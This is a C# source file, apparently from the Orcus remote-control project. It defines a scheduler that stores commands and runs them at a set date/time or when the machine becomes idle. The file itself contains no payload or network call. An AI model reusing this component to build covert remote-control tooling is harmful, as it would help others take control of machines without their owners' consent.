using System;
using System.Collections.Generic;
using System.Linq;
using Orcus.Shared.DynamicCommands;
using Orcus.Shared.DynamicCommands.ExecutionEvents;
using Orcus.StaticCommandManagement.ExecutionEvents;

namespace Orcus.StaticCommandManagement
{
    public class StaticCommandScheduler
    {
        public delegate void ExecutePotentialCommandDelegate(PotentialCommand potentialCommand);

        private readonly Dictionary<uint, Type> _executionEvents;
        private DynamicCommandStore _dynamicCommandStore;
        private ExecutePotentialCommandDelegate _executePotentialCommandDelegate;

        public StaticCommandScheduler()
        {
            _executionEvents =
                new Dictionary<uint, Type>(
                    new IExecutionEvent[] {new DateTimeExecutionEvent(), new IdleExecutionEvent()}.ToDictionary(
                        x => x.Id, y => y.GetType()));
        }

        public void Initialize(ExecutePotentialCommandDelegate executePotentialCommandDelegate,
            DynamicCommandStore dynamicCommandStore)
        {
            _executePotentialCommandDelegate = executePotentialCommandDelegate;
            _dynamicCommandStore = dynamicCommandStore;

            lock (dynamicCommandStore.ListLock)
                foreach (var potentialCommand in dynamicCommandStore.StoredCommands)
                {
                    InitializePotentialCommand(potentialCommand, true);
                }
        }

        public void AddPotentialCommand(PotentialCommand potentialCommand)
        {
            InitializePotentialCommand(potentialCommand, false);
        }

        private void InitializePotentialCommand(PotentialCommand potentialCommand, bool isStored)
        {
            Type executionEventType;
            if (_executionEvents.TryGetValue(potentialCommand.ExecutionEvent.Id, out executionEventType))
            {
                var executionEvent = (IExecutionEvent) Activator.CreateInstance(executionEventType);
                executionEvent.Initialize(potentialCommand.ExecutionEvent.Parameter);

                if (!executionEvent.CanExecute)
                {
                    if (!isStored)
                        _dynamicCommandStore.AddStoredCommand(potentialCommand);

                    executionEvent.TheTimeHasCome += (sender, args) =>
                    {
                        _executePotentialCommandDelegate(potentialCommand);
                        _dynamicCommandStore.RemoveStoredCommand(potentialCommand);
                    };
                    return;
                }
            }

            _dynamicCommandStore.RemoveStoredCommand(potentialCommand);
            _executePotentialCommandDelegate(potentialCommand);
        }
    }
}